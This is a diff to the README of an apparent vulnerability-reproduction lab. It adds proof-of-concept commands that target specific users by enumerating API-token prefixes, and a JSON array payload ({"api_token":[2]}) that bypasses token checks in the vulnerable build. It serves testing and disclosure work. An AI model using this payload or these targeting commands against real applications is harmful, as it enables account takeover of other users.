@@ -13,6 +13,12 @@ $ python poc.py
 
 # Inspect the requests with Burp Suite / mitmproxy
 $ python poc.py --proxy http://127.0.0.1:8080
+
+# Target a specific user id (enumerates the token leading value [0..9])
+$ python poc.py --target 2
+
+# Target a specific user email
+$ python poc.py --targetUser user2@email.com
 ```
 
 Expected output:
@@ -107,7 +113,7 @@ Wait for the build (~2-4 min on first run). The lab exposes:
 - **fixed** app — `13.x#9b21ce0a` (first shipped in v13.27.0): http://localhost:8892
 - MySQL 8 (internal only, not published)
 
-Seeded data: one user (`user@email.com`) with `api_token = b7f9d2c4a8e6b1f3d5a0c9e2b4d6f8a1c`.
+Seeded data: two users — `user@email.com` with `api_token = b7f9d2c4a8e6b1f3d5a0c9e2b4d6f8a1c` (letter-first) and `user2@email.com` with `api_token = 2d4f6h8j…` (digit-first, reachable via `{"api_token":[2]}`).
 
 ```bash
 # Test exploit
